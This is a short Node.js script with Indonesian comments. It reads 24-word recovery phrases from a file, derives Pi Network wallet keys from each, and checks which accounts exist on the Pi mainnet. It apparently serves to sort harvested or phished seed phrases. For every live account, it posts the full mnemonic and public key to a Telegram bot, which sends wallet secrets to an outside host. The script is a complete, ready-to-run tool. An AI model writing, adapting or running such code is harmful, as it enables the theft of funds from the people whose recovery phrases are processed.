const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const { Keypair, Server } = require('stellar-sdk');

const server = new Server('https://api.mainnet.minepi.com');

// 🔐 Ganti dengan token dan chat ID bot Anda
const TELEGRAM_BOT_TOKEN = 'ISI_DENGAN_TOKEN_BOT_ANDA';
const TELEGRAM_CHAT_ID = 'ISI_DENGAN_CHAT_ID_ANDA';

async function sendToTelegram(text) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error('❌ Gagal kirim ke Telegram:', err.response?.data || err.message);
  }
}

function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  return Keypair.fromRawEd25519Seed(key);
}

const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line.split(' ').length === 24);

fs.writeFileSync('valid.txt', '');
fs.writeFileSync('invalid.txt', '');

async function checkMnemonics(list) {
  for (const mnemonic of list) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      await server.loadAccount(pubkey);

      const msg = `✅ *Terdaftar*\n🧠 Mnemonic:\n\`${mnemonic}\`\n🔐 Public Key: \`${pubkey}\``;
      console.log(msg);
      fs.appendFileSync('valid.txt', mnemonic + '\n');
      await sendToTelegram(msg);

    } catch (err) {
      if (err.response && err.response.status === 404) {
        console.log(`❌ Tidak terdaftar: ${mnemonic}`);
        fs.appendFileSync('invalid.txt', mnemonic + '\n');
      } else {
        console.error(`⚠️ Error pada mnemonic: ${mnemonic}`);
        console.error(err.message);
      }
    }
  }
}

checkMnemonics(mnemonics);
